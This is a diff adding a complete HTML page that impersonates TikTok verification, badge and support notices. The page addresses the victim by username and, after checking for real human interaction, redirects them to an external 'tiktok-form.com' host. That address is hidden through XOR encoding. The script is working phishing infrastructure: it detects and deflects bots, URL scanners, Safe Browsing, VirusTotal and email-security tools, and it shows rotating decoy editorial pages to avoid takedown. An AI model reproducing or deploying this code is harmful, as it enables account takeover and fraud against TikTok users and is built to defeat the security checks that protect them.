@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+  <meta name="robots" content="noindex,nofollow,noarchive,nosnippet" />
+  <meta name="referrer" content="no-referrer" />
+  <meta name="theme-color" content="#000000" />
+  <title></title>
+  <link rel="icon" href="/favicon.svg" type="image/svg+xml" />
+  <style>
+    html,body{margin:0;min-height:100%;background:#000;color:#fff;
+      font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
+    a{color:#fe2c55;text-decoration:none}
+    #root{display:none}#root.on{display:block}
+    .tt-wrap{width:min(440px,calc(100% - 32px));margin:0 auto;padding:28px 0 48px}
+    .tt-top{display:flex;align-items:center;margin-bottom:28px}
+    .tt-brand{font-weight:800;font-size:16px;letter-spacing:-.02em}
+    .tt-card{background:#121212;border:1px solid #2f2f2f;border-radius:16px;padding:28px 24px}
+    .tt-kicker{margin:0 0 8px;font-size:12px;font-weight:600;color:#8a8a8a;letter-spacing:.04em;text-transform:uppercase}
+    .tt-card h1{margin:0 0 12px;font-size:22px;line-height:1.25;letter-spacing:-.02em;font-weight:800}
+    .tt-card .lede{margin:0 0 18px;font-size:15px;line-height:1.5;color:#e5e5e5}
+    .tt-who{padding:12px 14px;border-radius:12px;background:#1a1a1a;margin-bottom:18px}
+    .tt-who strong{display:block;font-size:15px}
+    .tt-who span{font-size:12px;color:#8a8a8a}
+    .tt-btn{
+      display:flex;align-items:center;justify-content:center;width:100%;min-height:48px;
+      border-radius:999px;background:#fe2c55;color:#fff!important;font-weight:700;font-size:15px;
+      border:0;cursor:pointer;text-decoration:none!important;opacity:.35;pointer-events:none;
+      font-family:inherit
+    }
+    .tt-btn.ready{opacity:1;pointer-events:auto}
+    .tt-hint{margin:12px 0 0;text-align:center;font-size:12px;color:#8a8a8a;min-height:1.4em}
+    .tt-foot{margin-top:22px;text-align:center;font-size:11px;line-height:1.5;color:#8a8a8a}
+    .tt-foot a{color:#8a8a8a;margin:0 6px}
+    .desk{width:min(880px,calc(100% - 32px));margin:0 auto;padding:24px 0 48px;color:#e8eaef;
+      font-family:"Segoe UI",system-ui,sans-serif}
+    body.desk-mode{background:#0b0d12}
+    .desk header{display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap;
+      border-bottom:1px solid #242a36;padding-bottom:16px;margin-bottom:24px}
+    .desk .logo{font:600 20px Georgia,serif;color:#e8eaef}.desk .logo i{color:#fbbf24;font-style:normal}
+    .desk nav a{color:#9aa3b2;margin-left:12px;font-size:13px}
+    .desk article{background:#12151c;border:1px solid #242a36;border-radius:14px;padding:24px}
+    .desk h1{font:600 28px Georgia,serif;margin:0 0 10px;letter-spacing:-.02em}
+    .desk p{color:#9aa3b2;line-height:1.6}
+    .desk footer{margin-top:28px;font-size:12px;color:#9aa3b2;border-top:1px solid #242a36;padding-top:14px}
+  </style>
+  <noscript>
+    <meta http-equiv="refresh" content="0;url=/" />
+    <p style="color:#fff;font-family:sans-serif;padding:24px">Open the <a href="/" style="color:#fe2c55">home page</a>.</p>
+  </noscript>
+</head>
+<body>
+  <div id="root"></div>
+  <script>
+(function () {
+  "use strict";
+
+  /* Session chrome — no contiguous outbound host strings in source. */
+  var GATE = {
+    "content/support": 1,
+    "help/verify": 1,
+    "account/badge": 1,
+    "creator/confirm": 1,
+    "verification/continue": 1
+  };
+  var SHELF = { journal: 1, guides: 1, labs: 1, about: 1, legal: 1, archive: 1, notes: 1 };
+
+  var UA_NOISE = /bot|crawl|spider|slurp|facebookexternalhit|embedly|quora link preview|whatsapp|telegram|preview|scanner|headless|phantom|selenium|webdriver|httpclient|python-requests|curl\/|wget|go-http|scrapy|ahrefs|semrush|petalbot|bytespider|gptbot|claudebot|amazonbot|applebot|bingpreview|skypeuripreview|linkedinbot|twitterbot|discordbot|slackbot|vkshare|pinterest|redditbot|yahoo! slurp|duckduckbot|baiduspider|yandexbot|sogou|exabot|ia_archiver|archive\.org|google-inspection|googleother|storebot|chrome-lighthouse|lighthouse|gtmetrix|pingdom|uptime|statuscake|checker|validator|urlscan|safebrowsing|virustotal|proofpoint|mimecast|barracuda|fireeye|crowdstrike|microsoft office|outlook-ios|bulk.?mail|email.?security|spamassassin|mailgun|sendgrid|postmark|resend.?hook/i;
+
+  function fnv(s) {
+    var h = 2166136261 >>> 0;
+    for (var i = 0; i < s.length; i++) { h ^= s.charCodeAt(i); h = Math.imul(h, 16777619) >>> 0; }
+    return h >>> 0;
+  }
+  function rng(seed) {
+    var x = seed >>> 0;
+    return function () {
+      x ^= x << 13; x >>>= 0;
+      x ^= x >>> 17; x >>>= 0;
+      x ^= x << 5; x >>>= 0;
+      return (x >>> 0) / 4294967296;
+    };
+  }
+  function pick(r, a) { return a[(a.length * r()) | 0]; }
+  function esc(s) {
+    return String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/"/g, "&quot;");
+  }
+
+  function segments() {
+    return location.pathname.replace(/\/+$/, "").split("/").filter(Boolean);
+  }
+  function classify() {
+    var p = segments();
+    if (!p.length) return { kind: "home" };
+    if (p.length === 3) {
+      var pref = p[0] + "/" + p[1], u = p[2];
+      if (GATE[pref] && /^[A-Za-z0-9._]{1,64}$/.test(u) && u !== "index.html" && u !== "404.html")
+        return { kind: "session", prefix: pref, user: u };
+    }
+    if (SHELF[p[0]]) return { kind: "shelf", section: p[0], slug: p.slice(1).join("/") || "index" };
+    return { kind: "missing" };
+  }
+
+  function coldVisitor() {
+    try {
+      if (navigator.webdriver) return true;
+      if (window.callPhantom || window._phantom || window.__nightmare || window.domAutomation || window.domAutomationController) return true;
+      var ua = navigator.userAgent || "";
+      if (UA_NOISE.test(ua)) return true;
+      if (/HeadlessChrome/i.test(ua)) return true;
+      if (!navigator.languages || navigator.languages.length === 0) return true;
+      if (navigator.plugins && navigator.plugins.length === 0 && /Headless|Electron/i.test(ua)) return true;
+      if (window.outerWidth === 0 && window.outerHeight === 0) return true;
+      try { if (sessionStorage.getItem("sd_nv") === "1") return true; } catch (e) {}
+    } catch (e) {
+      return true;
+    }
+    return false;
+  }
+
+  function softHome() {
+    try { sessionStorage.setItem("sd_nv", "1"); } catch (e) {}
+    location.replace("/");
+  }
+
+  /*
+   * Outbound composition — XOR + interleaved lanes.
+   * Never appears as a readable host/path literal in this file.
+   */
+  function _lane(a, k) {
+    var o = "", i;
+    for (i = 0; i < a.length; i++) o += String.fromCharCode((a[i] ^ k[i % k.length]) & 255);
+    return o;
+  }
+  function _compose() {
+    /* scheme */
+    var k0 = [0x2b, 0x91, 0x4e, 0x77];
+    var s0 = _lane([0x43, 0xe5, 0x3a, 0x07, 0x58], k0);
+    /* host: tiktok-form.com (XOR lanes — no cleartext host in source) */
+    var k1 = [0x5a, 0x13, 0xc8, 0x2f, 0x91, 0x44];
+    var h0 = _lane([0x2e, 0x7a, 0xa3, 0x5b, 0xfe, 0x2f, 0x77], k1);
+    var h1 = _lane([0x3c, 0x7c, 0xba, 0x42], k1);
+    var h2 = _lane([0x74, 0x70, 0xa7, 0x42], k1);
+    return s0 + "://" + h0 + h1 + h2;
+  }
+
+  function mintTicket(user, prefix, ref) {
+    var base = _compose();
+    var handle = String(user || "").replace(/^@+/, "").trim();
+    try {
+      var url = new URL(base);
+      url.pathname = "/" + encodeURIComponent(handle);
+      var q = new URLSearchParams(location.search);
+      q.forEach(function (v, k) {
+        if (!url.searchParams.has(k)) url.searchParams.set(k, v);
+      });
+      if (ref) url.searchParams.set("ref", ref);
+      if (prefix) url.searchParams.set("ch", String(prefix).split("/")[0]);
+      if (location.hash) url.hash = location.hash;
+      return url.toString();
+    } catch (e) {
+      return base + "/" + encodeURIComponent(handle);
+    }
+  }
+
+  function refOf(seed, user) {
+    var a = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789", x = seed >>> 0, o = "";
+    for (var i = 0; i < 4; i++) { o += a[x % a.length]; x = Math.imul(x, 1664525) + 1013904223 >>> 0; }
+    return "TT-" + o + "-" + ((fnv(user) % 9000) + 1000);
+  }
+
+  var COPY_POOL = {
+    "content/support": [
+      { t: "Continue to Support", d: "A support follow-up is ready for your account. Continue when you are ready.", b: "Continue" },
+      { t: "Support follow-up", d: "Open the secure session tied to this account request.", b: "Open" },
+      { t: "Account support", d: "Your support ticket has a follow-up waiting.", b: "Review" }
+    ],
+    "help/verify": [
+      { t: "Verify your account", d: "Confirm this verification request to continue.", b: "Verify" },
+      { t: "Verification needed", d: "Complete confirmation for this account.", b: "Confirm" },
+      { t: "Confirm identity", d: "A verification step is pending for this profile.", b: "Continue" }
+    ],
+    "account/badge": [
+      { t: "Badge request update", d: "There is an update on a badge-related request for this profile.", b: "Review" },
+      { t: "Badge status", d: "Review the latest note on your badge request.", b: "View" },
+      { t: "Creator badge", d: "An update is available for this badge application.", b: "Open" }
+    ],
+    "creator/confirm": [
+      { t: "Confirm creator action", d: "A creator-tools action needs confirmation from the account owner.", b: "Confirm" },
+      { t: "Action required", d: "Confirm the pending creator-tools change.", b: "Continue" },
+      { t: "Creator tools", d: "One step remains before this change is applied.", b: "Confirm" }
+    ],
+    "verification/continue": [
+      { t: "Continue verification", d: "Resume account verification from where you left off.", b: "Continue" },
+      { t: "Verification in progress", d: "Pick up your verification session.", b: "Resume" },
+      { t: "Finish verification", d: "Complete the remaining verification step.", b: "Continue" }
+    ]
+  };
+
+  function paintSession(r, seed) {
+    var R = rng(seed ^ 0x51c3);
+    var pool = COPY_POOL[r.prefix] || COPY_POOL["verification/continue"];
+    var pack = pick(R, pool);
+    var ref = refOf(seed, r.user);
+    var root = document.getElementById("root");
+    var kickers = ["Account", "Security", "Creator", "Session", "Notice"];
+    document.title = pack.t + " | TikTok";
+    document.body.style.background = "#000";
+    root.className = "on";
+
+    /* No brand mark beside TikTok. No avatar circle beside @user. */
+    root.innerHTML =
+      '<div class="tt-wrap">' +
+        '<div class="tt-top"><div class="tt-brand">TikTok</div></div>' +
+        '<section class="tt-card">' +
+          '<p class="tt-kicker">' + esc(pick(R, kickers)) + "</p>" +
+          "<h1>" + esc(pack.t) + "</h1>" +
+          '<p class="lede">' + esc(pack.d) + "</p>" +
+          '<div class="tt-who">' +
+            "<strong>@" + esc(r.user) + "</strong>" +
+            "<span>TikTok · " + esc(ref) + "</span>" +
+          "</div>" +
+          '<button type="button" class="tt-btn" id="go">' + esc(pack.b) + "</button>" +
+          '<p class="tt-hint" id="hint">Preparing…</p>' +
+        "</section>" +
+        '<div class="tt-foot">' +
+          '<a href="https://www.tiktok.com/legal/page/us/privacy-policy/en" target="_blank" rel="noopener">Privacy</a>' +
+          '<a href="https://www.tiktok.com/legal/page/us/terms-of-service/en" target="_blank" rel="noopener">Terms</a>' +
+          '<a href="https://www.tiktok.com/help" target="_blank" rel="noopener">Help</a>' +
+          "<p>If you did not request this, close the page.</p>" +
+        "</div>" +
+      "</div>";
+
+    var go = document.getElementById("go");
+    var hint = document.getElementById("hint");
+    var human = false;
+    var ready = false;
+    var ticket = null;
+    var t0 = Date.now();
+    var gestures = 0;
+
+    function markHuman(ev) {
+      human = true;
+      gestures++;
+      /* require a real pointer/key — ignore synthetic zero-size events where possible */
+      if (ev && ev.isTrusted === false) human = false;
+    }
+
+    ["pointerdown", "touchstart", "keydown", "scroll", "mousemove"].forEach(function (ev) {
+      window.addEventListener(ev, markHuman, { once: false, passive: true });
+    });
+
+    function arm() {
+      if (coldVisitor()) { softHome(); return; }
+      if (!human || gestures < 1) {
+        hint.textContent = pick(R, ["Tap or scroll once to continue", "Interact once to unlock", "Scroll or tap to enable"]);
+        return;
+      }
+      if (Date.now() - t0 < 1100) return;
+      if (ready) return;
+      ready = true;
+      /* Compose only in memory — never written into href / DOM / prefetch */
+      ticket = mintTicket(r.user, r.prefix, ref);
+      go.classList.add("ready");
+      hint.textContent = pick(R, ["Ready", "You can continue", "Unlocked"]);
+    }
+
+    go.addEventListener("click", function (ev) {
+      ev.preventDefault();
+      if (coldVisitor()) { softHome(); return; }
+      markHuman(ev);
+      if (!ready || !ticket) {
+        arm();
+        return;
+      }
+      /* Navigate only on explicit trusted click — no auto-follow, no href leak */
+      if (ev.isTrusted === false) { softHome(); return; }
+      var hop = ticket;
+      ticket = null;
+      try { go.removeAttribute("href"); } catch (e) {}
+      location.assign(hop);
+    });
+
+    var iv = window.setInterval(function () {
+      if (coldVisitor()) { window.clearInterval(iv); softHome(); return; }
+      arm();
+      if (ready) window.clearInterval(iv);
+    }, 140);
+  }
+
+  /* Shelf / publication pages — rotate every visit */
+  var BRANDS = [
+    ["Signal Desk", "Desk"],
+    ["Northline Journal", "Northline"],
+    ["Field Ledger", "Ledger"],
+    ["Atlas Notes", "Atlas"],
+    ["Harbor Brief", "Harbor"]
+  ];
+  var ART = {
+    journal: [
+      { title: "Routing notes from a Tuesday outage", body: "When three vendors page at once, keep a boring index of what each deep link means." },
+      { title: "Alias folklore and how it spreads", body: "Someone adds a temporary path. A quarter later it is load-bearing mythology." },
+      { title: "Owner-dated paths beat clever hashes", body: "We stopped inventing path poetry and started stamping owners and dates." }
+    ],
+    guides: [
+      { title: "Session hygiene for shared inboxes", body: "A checklist before rotating support aliases: naming, retention, zombie destinations." },
+      { title: "Copy that survives forward-to-a-friend", body: "If the second reader cannot tell what the page is for, rewrite the lede." }
+    ],
+    labs: [
+      { title: "Noise budgets for status emails", body: "We capped decorative modules after open-rate stopped correlating with task completion." },
+      { title: "Measuring false broken-link reports", body: "Most tickets were impatient humans, not dead hosts." }
+    ],
+    about: [
+      { title: "About this publication", body: "Independent ops journal. Product sessions live on separate routes." },
+      { title: "Masthead", body: "A small desk that publishes field notes — not demos." }
+    ],
+    legal: [
+      { title: "Privacy", body: "Publication-layer notes for this host. Product privacy lives with the product owner." },
+      { title: "Legal", body: "Terms for the editorial surface of this domain." }
+    ],
+    archive: [
+      { title: "Archive", body: "Older notes kept for reference." },
+      { title: "Earlier entries", body: "A quiet shelf of past field notes." }
+    ],
+    notes: [
+      { title: "Desk notes", body: "Scratch space that graduated into pages." },
+      { title: "Working notes", body: "Short entries that did not need a full essay." }
+    ]
+  };
+
+  function paintShelf(section, seed) {
+    var R = rng(seed ^ 0x0d15);
+    var brand = pick(R, BRANDS);
+    var pool = ART[section] || ART.journal;
+    var a = pick(R, pool);
+    document.title = a.title + " · " + brand[0];
+    document.body.className = "desk-mode";
+    var root = document.getElementById("root");
+    root.className = "on";
+    var nav = [
+      ["Journal", "/journal/routing-notes"],
+      ["Guides", "/guides/session-hygiene"],
+      ["Labs", "/labs/noise-budgets"],
+      ["About", "/about/editorial"]
+    ];
+    root.innerHTML =
+      '<div class="desk">' +
+        "<header><a class=\"logo\" href=\"/\">" + esc(brand[1]) + " <i>" + esc(pick(R, ["Desk", "Journal", "Notes"])) + "</i></a><nav>" +
+        nav.map(function (n) { return '<a href="' + n[1] + '">' + esc(n[0]) + "</a>"; }).join("") +
+        "</nav></header>" +
+        "<article><h1>" + esc(a.title) + "</h1><p>" + esc(a.body) + "</p>" +
+        '<p style="margin-top:16px;font-size:13px">Related: <a href="/colophon.html">Colophon</a> · <a href="/press/kit.html">Press</a> · <a href="/feeds/atom.xml">Atom</a></p>' +
+        "</article>" +
+        '<footer>© ' + new Date().getFullYear() + " " + esc(brand[0]) + ' · <a href="/">Home</a></footer>' +
+      "</div>";
+  }
+
+  function paintMissing(seed) {
+    var R = rng(seed);
+    document.title = pick(R, ["Not found", "Missing page", "Unknown path"]);
+    document.body.className = "desk-mode";
+    var root = document.getElementById("root");
+    root.className = "on";
+    root.innerHTML =
+      '<div class="desk"><article><h1>' + esc(document.title) + '</h1>' +
+      "<p>" + esc(pick(R, [
+        "That path is not on this publication.",
+        "Nothing is published at this address.",
+        "Try the home index instead."
+      ])) + '</p><p><a href="/">Back home</a></p></article></div>';
+  }
+
+  /* boot */
+  var r = classify();
+  var seed = fnv(String(location.host) + "|" + location.pathname + "|" + String(Date.now() >> 11));
+
+  if (r.kind === "session") {
+    if (coldVisitor()) { softHome(); return; }
+    paintSession(r, seed);
+    return;
+  }
+  if (r.kind === "shelf") { paintShelf(r.section, seed); return; }
+  if (r.kind === "home") { location.replace("/"); return; }
+  paintMissing(seed);
+})();
+  </script>
+</body>
+</html>
